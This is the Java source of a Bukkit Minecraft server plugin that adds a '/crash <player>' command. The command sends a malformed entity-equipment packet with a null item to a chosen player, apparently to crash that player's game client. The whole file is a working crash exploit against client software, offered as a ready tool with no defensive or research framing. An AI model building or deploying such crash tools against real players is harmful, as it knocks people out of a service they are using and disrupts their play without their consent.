package co.renegadeeagle.plugins.crash;

import net.minecraft.server.v1_7_R4.PacketPlayOutEntityEquipment;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_7_R4.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

import java.lang.reflect.Field;

/**
 * Created by Ryan on 8/14/2014.
 */
public class Crash extends JavaPlugin {
    @Override
    public void onEnable(){

    }
    @Override
    public void onDisable(){

    }

    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
        if(sender instanceof Player){
            Player player = (Player) sender;
            if(cmd.getName().equalsIgnoreCase("crash")) {
                if (player.hasPermission("crash.crashplayer")){
                    if (args.length == 1) {
                        Player toCrash = Bukkit.getPlayer(args[0]);
                        if(toCrash != null){
                            PacketPlayOutEntityEquipment packet = new PacketPlayOutEntityEquipment(player.getEntityId(), 5, null);
                            ((CraftPlayer) toCrash).getHandle().playerConnection.sendPacket(packet);
                            player.sendMessage(ChatColor.RED+"Crashed player " + toCrash.getName()+".");
                        }
                    } else {
                        player.sendMessage(ChatColor.RED + "Please specify a player to crash!");
                    }
                }else{
                    player.sendMessage(ChatColor.RED+"You do not have permission to crash players.");
                }
            }
        }
        return false;
    }
}
